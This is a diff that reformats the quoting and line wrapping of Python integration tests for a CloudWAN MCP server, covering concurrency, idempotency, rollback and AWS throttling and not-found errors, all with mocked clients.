-        with patch('awslabs.cloudwan_mcp_server.server.analyze_tgw_routes', cancellation_aware_analyze_tgw_routes):
+        with patch("awslabs.cloudwan_mcp_server.server.analyze_tgw_routes", cancellation_aware_analyze_tgw_routes):
             # Create long-running tasks
             tasks = []
             for i in range(20):
-                task = asyncio.create_task(
-                    cancellation_aware_analyze_tgw_routes(f'tgw-rtb-cancel-test-{i:02d}')
-                )
+                task = asyncio.create_task(cancellation_aware_analyze_tgw_routes(f"tgw-rtb-cancel-test-{i:02d}"))
                 tasks.append(task)
 
             # Wait briefly to ensure tasks are running
@@ -496,25 +494,23 @@
 
                 # Count successful completions vs cancellations
                 successful_completions = sum(
-                    1 for r in results
-                    if isinstance(r, str) and json.loads(r).get('success', False)
+                    1 for r in results if isinstance(r, str) and json.loads(r).get("success", False)
                 )
 
-                cancelled_exceptions = sum(
-                    1 for r in results
-                    if isinstance(r, asyncio.CancelledError)
-                )
+                cancelled_exceptions = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
 
                 # Verify cancellation scenarios
-                assert len(cancellation_scenarios) == 10, f"Expected 10 cancellation scenarios, got {len(cancellation_scenarios)}"
+                assert len(cancellation_scenarios) == 10, (
+                    f"Expected 10 cancellation scenarios, got {len(cancellation_scenarios)}"
+                )
                 assert cancelled_exceptions == 10, f"Expected 10 CancelledError exceptions, got {cancelled_exceptions}"
                 assert successful_completions >= 8, f"Too few task completions: {successful_completions}"
 
                 # Check that all cancellation scenarios have proper metadata
                 for scenario in cancellation_scenarios:
-                    assert 'operation_id' in scenario
-                    assert 'cancelled_at' in scenario
-                    assert scenario['cleanup_completed'] == True
+                    assert "operation_id" in scenario
+                    assert "cancelled_at" in scenario
+                    assert scenario["cleanup_completed"] == True
 
             except Exception as e:
                 pytest.fail(f"Unexpected error in task cancellation test: {e}")
@@ -543,7 +539,7 @@
             def contended_operation(**kwargs):
                 nonlocal successful_acquisitions, failed_acquisitions
 
-                resource_id = kwargs.get('CoreNetworkId', 'default-resource')
+                resource_id = kwargs.get("CoreNetworkId", "default-resource")
 
                 # Simulate resource locking
                 lock_start = time.time()
@@ -554,8 +550,8 @@
                     if time.time() - lock_start > max_wait:
                         failed_acquisitions += 1
                         raise ClientError(
-                            {'Error': {'Code': 'ResourceContention', 'Message': f'Resource {resource_id} locked'}},
-                            'GetCoreNetworkPolicy'
+                            {"Error": {"Code": "ResourceContention", "Message": f"Resource {resource_id} locked"}},
+                            "GetCoreNetworkPolicy",
                         )
 
                 wait_time = time.time() - lock_start
@@ -571,13 +567,15 @@
                     time.sleep(processing_time)
 
                     return {
-                        'CoreNetworkPolicy': {
-                            'PolicyVersionId': '1',
-                            'PolicyDocument': json.dumps({
-                                'version': '2021.12',
-                                'resource-id': resource_id,
-                                'processed-by': shared_resource_locks[resource_id]
-                            })
+                        "CoreNetworkPolicy": {
+                            "PolicyVersionId": "1",
+                            "PolicyDocument": json.dumps(
+                                {
+                                    "version": "2021.12",
+                                    "resource-id": resource_id,
+                                    "processed-by": shared_resource_locks[resource_id],
+                                }
+                            ),
                         }
                     }
                 finally:
@@ -588,28 +586,18 @@
             mock_client.get_core_network_policy.side_effect = contended_operation
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=resource_contention_mock):
-
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=resource_contention_mock):
             # Create contention scenario - multiple requests for same resources
-            resource_ids = [f'core-network-resource-{i:02d}' for i in range(5)]  # 5 resources
+            resource_ids = [f"core-network-resource-{i:02d}" for i in range(5)]  # 5 resources
             requests_per_resource = 10  # 10 requests per resource = 50 total
 
             async def contended_request(resource_id, request_num):
                 try:
                     result = await get_core_network_policy(resource_id)
                     parsed = json.loads(result)
-                    return {
-                        'success': parsed['success'],
-                        'resource_id': resource_id,
-                        'request_num': request_num
-                    }
+                    return {"success": parsed["success"], "resource_id": resource_id, "request_num": request_num}
                 except Exception as e:
-                    return {
-                        'success': False,
-                        'resource_id': resource_id,
-                        'request_num': request_num,
-                        'error': str(e)
-                    }
+                    return {"success": False, "resource_id": resource_id, "request_num": request_num, "error": str(e)}
 
             # Create all contended requests
             all_tasks = []
@@ -623,11 +611,13 @@
             end_time = time.time()
 
             execution_time = end_time - start_time
-            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get('success', False))
+            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get("success", False))
 
             # Resource contention should be handled gracefully
             total_requests = len(all_tasks)
-            assert successful_requests >= total_requests * 0.9, f"Resource contention: {successful_requests}/{total_requests}"
+            assert successful_requests >= total_requests * 0.9, (
+                f"Resource contention: {successful_requests}/{total_requests}"
+            )
             assert execution_time < 120.0, f"Resource contention test took {execution_time:.2f}s"
 
             # Analyze resource wait patterns
@@ -638,8 +628,9 @@
                 assert avg_wait < 1.0, f"Average resource wait {avg_wait:.3f}s"
                 assert max_wait < 5.0, f"Max resource wait {max_wait:.3f}s"
 
-            print(f"Resource contention: {successful_acquisitions} successful, "
-                  f"{failed_acquisitions} failed acquisitions")
+            print(
+                f"Resource contention: {successful_acquisitions} successful, {failed_acquisitions} failed acquisitions"
+            )
 
 
 class TestAtomicOperationValidation:
@@ -672,62 +663,57 @@
                     update_conflicts += 1
                     raise ClientError(
                         {
-                            'Error': {
-                                'Code': 'OptimisticLockException',
-                                'Message': f'Policy version changed from {current_version} to {policy_version_counter}',
-                                'ExpectedVersion': str(current_version),
-                                'ActualVersion': str(policy_version_counter)
+                            "Error": {
+                                "Code": "OptimisticLockException",
+                                "Message": f"Policy version changed from {current_version} to {policy_version_counter}",
+                                "ExpectedVersion": str(current_version),
+                                "ActualVersion": str(policy_version_counter),
                             }
                         },
-                        'UpdateCoreNetworkPolicy'
+                        "UpdateCoreNetworkPolicy",
                     )
 
                 # Simulate successful atomic update
                 policy_version_counter += 1
                 successful_updates += 1
 
-                concurrent_updates.append({
-                    'timestamp': operation_start,
-                    'old_version': current_version,
-                    'new_version': policy_version_counter,
-                    'thread_id': threading.current_thread().ident
-                })
+                concurrent_updates.append(
+                    {
+                        "timestamp": operation_start,
+                        "old_version": current_version,
+                        "new_version": policy_version_counter,
+                        "thread_id": threading.current_thread().ident,
+                    }
+                )
 
                 return {
-                    'CoreNetworkPolicy': {
-                        'PolicyVersionId': str(policy_version_counter),
-                        'PolicyDocument': json.dumps({
-                            'version': '2021.12',
-                            'update-timestamp': operation_start,
-                            'atomic-operation': True
-                        }),
-                        'ChangeSetState': 'READY_TO_EXECUTE'
+                    "CoreNetworkPolicy": {
+                        "PolicyVersionId": str(policy_version_counter),
+                        "PolicyDocument": json.dumps(
+                            {"version": "2021.12", "update-timestamp": operation_start, "atomic-operation": True}
+                        ),
+                        "ChangeSetState": "READY_TO_EXECUTE",
                     }
                 }
 
             mock_client.get_core_network_policy.side_effect = atomic_update_operation
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=atomic_policy_mock):
-
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=atomic_policy_mock):
             # Test concurrent atomic operations
             concurrent_operations = 50
 
             async def atomic_operation_request(request_id):
                 try:
-                    result = await get_core_network_policy(f'core-network-atomic-{request_id:03d}')
+                    result = await get_core_network_policy(f"core-network-atomic-{request_id:03d}")
                     parsed = json.loads(result)
                     return {
-                        'success': parsed['success'],
-                        'request_id': request_id,
-                        'policy_version': parsed.get('policy_version_id', 'unknown')
+                        "success": parsed["success"],
+                        "request_id": request_id,
+                        "policy_version": parsed.get("policy_version_id", "unknown"),
                     }
                 except Exception as e:
-                    return {
-                        'success': False,
-                        'request_id': request_id,
-                        'error': str(e)
-                    }
+                    return {"success": False, "request_id": request_id, "error": str(e)}
 
             tasks = [atomic_operation_request(i) for i in range(concurrent_operations)]
 
@@ -736,16 +722,18 @@
             end_time = time.time()
 
             execution_time = end_time - start_time
-            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get('success', False))
+            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get("success", False))
 
             # Atomic operations should maintain consistency
             assert successful_updates > 0, "No successful atomic updates"
-            assert successful_requests >= concurrent_operations * 0.8, f"Atomic operations: {successful_requests}/{concurrent_operations}"
+            assert successful_requests >= concurrent_operations * 0.8, (
+                f"Atomic operations: {successful_requests}/{concurrent_operations}"
+            )
             assert execution_time < 60.0, f"Atomic operations took {execution_time:.2f}s"
 
             # Verify no version conflicts in successful updates
             if concurrent_updates:
-                versions = [update['new_version'] for update in concurrent_updates]
+                versions = [update["new_version"] for update in concurrent_updates]
                 assert len(set(versions)) == len(versions), "Version collision detected in atomic updates"
                 assert max(versions) == len(concurrent_updates), "Version sequence not maintained"
 
@@ -766,7 +754,7 @@
             def token_aware_operation(**kwargs):
                 nonlocal token_refresh_count, token_conflicts
 
-                client_id = kwargs.get('ClientId', 'default-client')
+                client_id = kwargs.get("ClientId", "default-client")
 
                 # Simulate token expiry and refresh logic
                 current_time = time.time()
@@ -774,16 +762,16 @@
                 if client_id not in session_tokens:
                     # Initial token creation
                     session_tokens[client_id] = {
-                        'token': f'token-{client_id}-{token_refresh_count:06d}',
-                        'expires_at': current_time + 3600,  # 1 hour
-                        'created_at': current_time
+                        "token": f"token-{client_id}-{token_refresh_count:06d}",
+                        "expires_at": current_time + 3600,  # 1 hour
+                        "created_at": current_time,
                     }
                     token_refresh_count += 1
 
                 token_info = session_tokens[client_id]
 
                 # Check for token expiry (simulate short expiry for testing)
-                if current_time > token_info['expires_at'] - 3500:  # Refresh 100s before expiry
+                if current_time > token_info["expires_at"] - 3500:  # Refresh 100s before expiry
                     # Token refresh race condition window
                     time.sleep(0.01)
 
@@ -791,9 +779,9 @@
                     if session_tokens[client_id] == token_info:
                         # We won the race - refresh token
                         session_tokens[client_id] = {
-                            'token': f'token-{client_id}-{token_refresh_count:06d}',
-                            'expires_at': current_time + 3600,
-                            'created_at': current_time
+                            "token": f"token-{client_id}-{token_refresh_count:06d}",
+                            "expires_at": current_time + 3600,
+                            "created_at": current_time,
                         }
                         token_refresh_count += 1
                     else:
@@ -801,10 +789,10 @@
                         token_conflicts += 1
 
                 return {
-                    'CoreNetworks': [
+                    "CoreNetworks": [
                         {
-                            'CoreNetworkId': f'core-network-token-{client_id}',
-                            'SessionToken': session_tokens[client_id]['token']
+                            "CoreNetworkId": f"core-network-token-{client_id}",
+                            "SessionToken": session_tokens[client_id]["token"],
                         }
                     ]
                 }
@@ -812,8 +800,7 @@
             mock_client.list_core_networks.side_effect = token_aware_operation
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=session_token_mock):
-
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=session_token_mock):
             # Test concurrent requests with shared session tokens
             clients_count = 10
             requests_per_client = 20
@@ -821,26 +808,17 @@
             async def session_token_request(client_id, request_num):
                 try:
                     # Add client identifier to trigger session token logic
-                    result = await list_core_networks(region='us-east-1')
+                    result = await list_core_networks(region="us-east-1")
                     parsed = json.loads(result)
-                    return {
-                        'success': parsed['success'],
-                        'client_id': client_id,
-                        'request_num': request_num
-                    }
+                    return {"success": parsed["success"], "client_id": client_id, "request_num": request_num}
                 except Exception as e:
-                    return {
-                        'success': False,
-                        'client_id': client_id,
-                        'request_num': request_num,
-                        'error': str(e)
-                    }
+                    return {"success": False, "client_id": client_id, "request_num": request_num, "error": str(e)}
 
             # Create concurrent requests from multiple clients
             all_tasks = []
             for client_id in range(clients_count):
                 for req_num in range(requests_per_client):
-                    task = session_token_request(f'client-{client_id:02d}', req_num)
+                    task = session_token_request(f"client-{client_id:02d}", req_num)
                     all_tasks.append(task)
 
             start_time = time.time()
@@ -848,19 +826,23 @@
             end_time = time.time()
 
             execution_time = end_time - start_time
-            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get('success', False))
+            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get("success", False))
             total_requests = len(all_tasks)
 
             # Session token handling should be robust
-            assert successful_requests >= total_requests * 0.95, f"Session token handling: {successful_requests}/{total_requests}"
+            assert successful_requests >= total_requests * 0.95, (
+                f"Session token handling: {successful_requests}/{total_requests}"
+            )
             assert execution_time < 90.0, f"Session token test took {execution_time:.2f}s"
 
             # Token management should be efficient
             assert token_refresh_count <= clients_count * 2, f"Too many token refreshes: {token_refresh_count}"
             assert token_conflicts <= total_requests * 0.1, f"Too many token conflicts: {token_conflicts}"
 
-            print(f"Session tokens: {len(session_tokens)} clients, "
-                  f"{token_refresh_count} refreshes, {token_conflicts} conflicts")
+            print(
+                f"Session tokens: {len(session_tokens)} clients, "
+                f"{token_refresh_count} refreshes, {token_conflicts} conflicts"
+            )
 
 
 class TestIdempotencyTokenHandling:
@@ -888,7 +870,7 @@
                 if idempotency_key in processed_operations:
                     # Duplicate operation - return cached result
                     duplicate_operations += 1
-                    return processed_operations[idempotency_key]['result']
+                    return processed_operations[idempotency_key]["result"]
                 else:
                     # New operation - process and cache
                     unique_operations += 1
@@ -897,30 +879,26 @@
                     time.sleep(0.02)  # 20ms processing time
 
                     result = {
-                        'Routes': [
+                        "Routes": [
                             {
-                                'DestinationCidrBlock': f'10.{unique_operations}.0.0/16',
-                                'State': 'active',
-                                'IdempotencyKey': str(idempotency_key),
-                                'ProcessedAt': time.time()
+                                "DestinationCidrBlock": f"10.{unique_operations}.0.0/16",
+                                "State": "active",
+                                "IdempotencyKey": str(idempotency_key),
+                                "ProcessedAt": time.time(),
                             }
                         ]
                     }
 
-                    processed_operations[idempotency_key] = {
-                        'result': result,
-                        'first_processed': time.time()
-                    }
+                    processed_operations[idempotency_key] = {"result": result, "first_processed": time.time()}
 
                     return result
 
             mock_client.search_transit_gateway_routes.side_effect = idempotent_operation
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=idempotent_mock):
-
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=idempotent_mock):
             # Test idempotent operations with intentional duplicates
-            route_table_ids = [f'tgw-rtb-idem-{i:02d}' for i in range(10)]  # 10 unique route tables
+            route_table_ids = [f"tgw-rtb-idem-{i:02d}" for i in range(10)]  # 10 unique route tables
             duplicate_factor = 5  # Each request repeated 5 times
 
             async def idempotent_request(route_table_id, attempt_num):
@@ -928,17 +906,17 @@
                     result = await analyze_tgw_routes(route_table_id)
                     parsed = json.loads(result)
                     return {
-                        'success': parsed['success'],
-                        'route_table_id': route_table_id,
-                        'attempt_num': attempt_num,
-                        'total_routes': parsed.get('analysis', {}).get('total_routes', 0)
+                        "success": parsed["success"],
+                        "route_table_id": route_table_id,
+                        "attempt_num": attempt_num,
+                        "total_routes": parsed.get("analysis", {}).get("total_routes", 0),
                     }
                 except Exception as e:
                     return {
-                        'success': False,
-                        'route_table_id': route_table_id,
-                        'attempt_num': attempt_num,
-                        'error': str(e)
+                        "success": False,
+                        "route_table_id": route_table_id,
+                        "attempt_num": attempt_num,
+                        "error": str(e),
                     }
 
             # Create requests with duplicates
@@ -953,13 +931,19 @@
             end_time = time.time()
 
             execution_time = end_time - start_time
-            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get('success', False))
+            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get("success", False))
             total_requests = len(all_tasks)
 
             # Idempotency should work correctly
-            assert successful_requests == total_requests, f"Idempotent operations: {successful_requests}/{total_requests}"
-            assert unique_operations == len(route_table_ids), f"Expected {len(route_table_ids)} unique operations, got {unique_operations}"
-            assert duplicate_operations == total_requests - unique_operations, f"Expected {total_requests - unique_operations} duplicates, got {duplicate_operations}"
+            assert successful_requests == total_requests, (
+                f"Idempotent operations: {successful_requests}/{total_requests}"
+            )
+            assert unique_operations == len(route_table_ids), (
+                f"Expected {len(route_table_ids)} unique operations, got {unique_operations}"
+            )
+            assert duplicate_operations == total_requests - unique_operations, (
+                f"Expected {total_requests - unique_operations} duplicates, got {duplicate_operations}"
+            )
 
             # Duplicates should be processed faster (cached results)
             expected_max_time = unique_operations * 0.02 + 10  # Processing time + overhead
@@ -983,82 +967,76 @@
             def bulk_operation(**kwargs):
                 nonlocal successful_batches, failed_batches
 
-                batch_id = kwargs.get('BatchId', f'batch-{len(operation_log):04d}')
-                operations = kwargs.get('Operations', [])
+                batch_id = kwargs.get("BatchId", f"batch-{len(operation_log):04d}")
+                operations = kwargs.get("Operations", [])
 
                 operation_results = []
                 rollback_needed = False
 
                 # Process operations in batch
                 for i, operation in enumerate(operations):
-                    op_id = f'{batch_id}-op-{i:03d}'
+                    op_id = f"{batch_id}-op-{i:03d}"
 
                     try:
                         # Simulate operation processing with potential failure
-                        if 'fail' in operation.get('type', '').lower() or i % 7 == 6:  # Fail every 7th operation
+                        if "fail" in operation.get("type", "").lower() or i % 7 == 6:  # Fail every 7th operation
                             raise ClientError(
-                                {'Error': {'Code': 'ValidationException', 'Message': f'Operation {op_id} failed'}},
-                                'BulkOperation'
+                                {"Error": {"Code": "ValidationException", "Message": f"Operation {op_id} failed"}},
+                                "BulkOperation",
                             )
 
                         # Successful operation
                         operation_result = {
-                            'OperationId': op_id,
-                            'Status': 'SUCCESS',
-                            'Result': f'Processed {operation.get("data", "unknown")}'
+                            "OperationId": op_id,
+                            "Status": "SUCCESS",
+                            "Result": f"Processed {operation.get('data', 'unknown')}",
                         }
                         operation_results.append(operation_result)
-                        operation_log.append({
-                            'batch_id': batch_id,
-                            'operation_id': op_id,
-                            'status': 'success',
-                            'timestamp': time.time()
-                        })
+                        operation_log.append(
+                            {"batch_id": batch_id, "operation_id": op_id, "status": "success", "timestamp": time.time()}
+                        )
 
                     except ClientError as e:
                         # Operation failed - need rollback
                         rollback_needed = True
-                        operation_results.append({
-                            'OperationId': op_id,
-                            'Status': 'FAILED',
-                            'Error': str(e)
-                        })
+                        operation_results.append({"OperationId": op_id, "Status": "FAILED", "Error": str(e)})
                         break  # Stop processing on first failure
 
                 if rollback_needed:
                     # Perform rollback of successful operations in this batch
                     rollback_ops = [
-                        log for log in operation_log
-                        if log['batch_id'] == batch_id and log['status'] == 'success'
+                        log for log in operation_log if log["batch_id"] == batch_id and log["status"] == "success"
                     ]
 
                     for rollback_op in rollback_ops:
-                        rollback_operations.append({
-                            'original_operation': rollback_op['operation_id'],
-                            'rollback_timestamp': time.time(),
-                            'batch_id': batch_id
-                        })
+                        rollback_operations.append(
+                            {
+                                "original_operation": rollback_op["operation_id"],
+                                "rollback_timestamp": time.time(),
+                                "batch_id": batch_id,
+                            }
+                        )
                         # Mark as rolled back
-                        rollback_op['status'] = 'rolled_back'
+                        rollback_op["status"] = "rolled_back"
 
                     failed_batches += 1
                     raise ClientError(
-                        {'Error': {'Code': 'BatchOperationFailed', 'Message': f'Batch {batch_id} failed, rollback completed'}},
-                        'BulkOperation'
+                        {
+                            "Error": {
+                                "Code": "BatchOperationFailed",
+                                "Message": f"Batch {batch_id} failed, rollback completed",
+                            }
+                        },
+                        "BulkOperation",
                     )
                 else:
                     successful_batches += 1
-                    return {
-                        'BatchId': batch_id,
-                        'Status': 'SUCCESS',
-                        'Operations': operation_results
-                    }
+                    return {"BatchId": batch_id, "Status": "SUCCESS", "Operations": operation_results}
 
             mock_client.bulk_create_routes = bulk_operation
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=bulk_rollback_mock):
-
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=bulk_rollback_mock):
             # Test bulk operations with rollback scenarios
             batch_count = 20
             operations_per_batch = 10
@@ -1068,8 +1046,8 @@
                     # Simulate bulk route creation (using tgw route analysis as proxy)
                     operations = [
                         {
-                            'type': 'create_route' if i % 7 != 6 else 'fail_route',  # Every 7th fails
-                            'data': f'route-{batch_num:02d}-{i:02d}'
+                            "type": "create_route" if i % 7 != 6 else "fail_route",  # Every 7th fails
+                            "data": f"route-{batch_num:02d}-{i:02d}",
                         }
                         for i in range(operations_per_batch)
                     ]
@@ -1077,25 +1055,16 @@
                     # Simulate bulk operation success/failure based on batch number
                     if batch_num % 7 == 6:  # Every 7th batch fails
                         return {
-                            'success': False,
-                            'batch_num': batch_num,
-                            'error': f'Bulk operation batch {batch_num} failed',
-                            'rollback_required': True
+                            "success": False,
+                            "batch_num": batch_num,
+                            "error": f"Bulk operation batch {batch_num} failed",
+                            "rollback_required": True,
                         }
                     else:
-                        return {
-                            'success': True,
-                            'batch_num': batch_num,
-                            'operations': len(operations)
-                        }
+                        return {"success": True, "batch_num": batch_num, "operations": len(operations)}
 
                 except Exception as e:
-                    return {
-                        'success': False,
-                        'batch_num': batch_num,
-                        'error': str(e),
-                        'rollback_required': True
-                    }
+                    return {"success": False, "batch_num": batch_num, "error": str(e), "rollback_required": True}
 
             tasks = [bulk_operation_request(i) for i in range(batch_count)]
 
@@ -1104,7 +1073,7 @@
             end_time = time.time()
 
             execution_time = end_time - start_time
-            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get('success', False))
+            successful_requests = sum(1 for r in results if isinstance(r, dict) and r.get("success", False))
 
             # Bulk operations with rollback should handle failures gracefully
             assert successful_requests >= batch_count * 0.7, f"Bulk operations: {successful_requests}/{batch_count}"
@@ -1112,20 +1081,22 @@
 
             # Verify rollback operations occurred
             total_operations = len(operation_log)
-            rolled_back_operations = sum(1 for log in operation_log if log['status'] == 'rolled_back')
+            rolled_back_operations = sum(1 for log in operation_log if log["status"] == "rolled_back")
 
-            assert len(rollback_operations) == rolled_back_operations, f"Rollback count mismatch: {len(rollback_operations)} vs {rolled_back_operations}"
+            assert len(rollback_operations) == rolled_back_operations, (
+                f"Rollback count mismatch: {len(rollback_operations)} vs {rolled_back_operations}"
+            )
 
             if rollback_operations:
                 avg_rollback_time = sum(
-                    rb['rollback_timestamp'] - next(
-                        log['timestamp'] for log in operation_log
-                        if log['operation_id'] == rb['original_operation']
-                    )
+                    rb["rollback_timestamp"]
+                    - next(log["timestamp"] for log in operation_log if log["operation_id"] == rb["original_operation"])
                     for rb in rollback_operations
                 ) / len(rollback_operations)
 
                 assert avg_rollback_time < 1.0, f"Average rollback time {avg_rollback_time:.3f}s too high"
 
-            print(f"Bulk operations: {successful_batches} successful batches, "
-                  f"{failed_batches} failed batches, {len(rollback_operations)} rollbacks")
+            print(
+                f"Bulk operations: {successful_batches} successful batches, "
+                f"{failed_batches} failed batches, {len(rollback_operations)} rollbacks"
+            )

--- cloudwan-mcp-server/tests/integration/test_direct_tools.py
+++ cloudwan-mcp-server/tests/integration/test_direct_tools.py
@@ -14,8 +14,7 @@
 
 
 #!/usr/bin/env python3
-"""Test CloudWAN MCP Tools directly using the tool registry
-"""
+"""Test CloudWAN MCP Tools directly using the tool registry"""
 
 import asyncio
 import json
@@ -23,7 +22,8 @@
 import sys
 
 
-sys.path.append('.')
+sys.path.append(".")
+
 
 async def test_direct_tools():
     """Test the MCP tools directly via tool registry"""
@@ -55,15 +55,15 @@
         result = await global_net_tool.execute({})
 
         # Extract text content from the result
-        if hasattr(result, 'content') and result.content:
+        if hasattr(result, "content") and result.content:
             response_text = result.content[0].text
             try:
                 response_data = json.loads(response_text)
                 print("✅ Global Networks Response:")
                 print(f"   - Total networks found: {response_data.get('total_count', 0)}")
                 print(f"   - Status: {response_data.get('status', 'unknown')}")
-                if response_data.get('global_networks'):
-                    for gn in response_data['global_networks']:
+                if response_data.get("global_networks"):
+                    for gn in response_data["global_networks"]:
                         print(f"   - Global Network: {gn.get('global_network_id', 'N/A')}")
                 else:
                     print("   - No global networks found (expected if CloudWAN not configured)")
@@ -79,15 +79,15 @@
         result2 = await core_net_tool.execute({})
 
         # Extract text content from the result
-        if hasattr(result2, 'content') and result2.content:
+        if hasattr(result2, "content") and result2.content:
             response_text2 = result2.content[0].text
             try:
                 response_data2 = json.loads(response_text2)
                 print("✅ Core Networks Response:")
                 print(f"   - Total networks found: {response_data2.get('total_count', 0)}")
                 print(f"   - Status: {response_data2.get('status', 'unknown')}")
-                if response_data2.get('core_networks'):
-                    for cn in response_data2['core_networks']:
+                if response_data2.get("core_networks"):
+                    for cn in response_data2["core_networks"]:
                         print(f"   - Core Network: {cn.get('core_network_id', 'N/A')}")
                         print(f"     Segments: {len(cn.get('segments', []))}")
                 else:
@@ -102,7 +102,9 @@
     except Exception as e:
         print(f"❌ Error testing MCP tools: {e}")
         import traceback
+
         traceback.print_exc()
 
+
 if __name__ == "__main__":
     asyncio.run(test_direct_tools())

--- cloudwan-mcp-server/tests/integration/test_error_simulation.py
+++ cloudwan-mcp-server/tests/integration/test_error_simulation.py
@@ -38,52 +38,48 @@
     @pytest.mark.asyncio
     async def test_throttling_exception_exponential_backoff(self):
         """Test ThrottlingException with exponential backoff simulation."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.list_core_networks.side_effect = ClientError(
                 {
-                    'Error': {
-                        'Code': 'ThrottlingException',
-                        'Message': 'Rate exceeded',
-                        'RetryAfterSeconds': '5'
+                    "Error": {"Code": "ThrottlingException", "Message": "Rate exceeded", "RetryAfterSeconds": "5"},
+                    "ResponseMetadata": {
+                        "RequestId": "req-throttle-123456789",
+                        "HTTPStatusCode": 429,
+                        "RetryAttempts": 3,
                     },
-                    'ResponseMetadata': {
-                        'RequestId': 'req-throttle-123456789',
-                        'HTTPStatusCode': 429,
-                        'RetryAttempts': 3
-                    }
                 },
-                'ListCoreNetworks'
+                "ListCoreNetworks",
             )
             mock_get_client.return_value = mock_client
 
             result = await list_core_networks()
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'ThrottlingException'
-            assert 'Rate exceeded' in parsed['error']
-            assert 'req-throttle-123456789' in parsed.get('request_id', '')
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "ThrottlingException"
+            assert "Rate exceeded" in parsed["error"]
+            assert "req-throttle-123456789" in parsed.get("request_id", "")
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_throttling_cascade_across_services(self):
         """Test throttling cascade affecting multiple AWS services."""
+
         def throttle_side_effect(service, region=None):
             mock_client = Mock()
-            if service == 'networkmanager':
+            if service == "networkmanager":
                 mock_client.list_core_networks.side_effect = ClientError(
-                    {'Error': {'Code': 'ThrottlingException', 'Message': 'NetworkManager throttled'}},
-                    'ListCoreNetworks'
+                    {"Error": {"Code": "ThrottlingException", "Message": "NetworkManager throttled"}},
+                    "ListCoreNetworks",
                 )
-            elif service == 'ec2':
+            elif service == "ec2":
                 mock_client.describe_vpcs.side_effect = ClientError(
-                    {'Error': {'Code': 'RequestLimitExceeded', 'Message': 'EC2 throttled'}},
-                    'DescribeVpcs'
+                    {"Error": {"Code": "RequestLimitExceeded", "Message": "EC2 throttled"}}, "DescribeVpcs"
                 )
             return mock_client
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=throttle_side_effect):
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=throttle_side_effect):
             # Test throttling across multiple services
             nm_result = await list_core_networks()
             vpc_result = await discover_vpcs()
@@ -91,41 +87,38 @@
             nm_parsed = json.loads(nm_result)
             vpc_parsed = json.loads(vpc_result)
 
-            assert nm_parsed['success'] is False
-            assert nm_parsed['error_code'] == 'ThrottlingException'
-            assert vpc_parsed['success'] is False
-            assert vpc_parsed['error_code'] == 'RequestLimitExceeded'
+            assert nm_parsed["success"] is False
+            assert nm_parsed["error_code"] == "ThrottlingException"
+            assert vpc_parsed["success"] is False
+            assert vpc_parsed["error_code"] == "RequestLimitExceeded"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_throttling_with_burst_capacity_exhaustion(self):
         """Test throttling after burst capacity exhaustion."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.get_core_network_policy.side_effect = ClientError(
                 {
-                    'Error': {
-                        'Code': 'ThrottlingException',
-                        'Message': 'Too Many Requests - burst capacity exhausted',
-                        'Type': 'Client'
+                    "Error": {
+                        "Code": "ThrottlingException",
+                        "Message": "Too Many Requests - burst capacity exhausted",
+                        "Type": "Client",
+                    },
+                    "ResponseMetadata": {
+                        "HTTPHeaders": {"x-amzn-requestid": "burst-exhausted-123", "retry-after": "30"}
                     },
-                    'ResponseMetadata': {
-                        'HTTPHeaders': {
-                            'x-amzn-requestid': 'burst-exhausted-123',
-                            'retry-after': '30'
-                        }
-                    }
                 },
-                'GetCoreNetworkPolicy'
+                "GetCoreNetworkPolicy",
             )
             mock_get_client.return_value = mock_client
 
-            result = await get_core_network_policy('core-network-123')
+            result = await get_core_network_policy("core-network-123")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'ThrottlingException'
-            assert 'burst capacity exhausted' in parsed['error']
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "ThrottlingException"
+            assert "burst capacity exhausted" in parsed["error"]
 
 
 class TestResourceNotFoundScenarios:
@@ -135,77 +128,77 @@
     @pytest.mark.asyncio
     async def test_core_network_not_found_cascade(self):
         """Test ResourceNotFoundException cascading through dependent operations."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.get_core_network_policy.side_effect = ClientError(
                 {
-                    'Error': {
-                        'Code': 'ResourceNotFoundException',
-                        'Message': 'Core network core-network-nonexistent does not exist',
-                        'ResourceType': 'CoreNetwork',
-                        'ResourceId': 'core-network-nonexistent'
+                    "Error": {
+                        "Code": "ResourceNotFoundException",
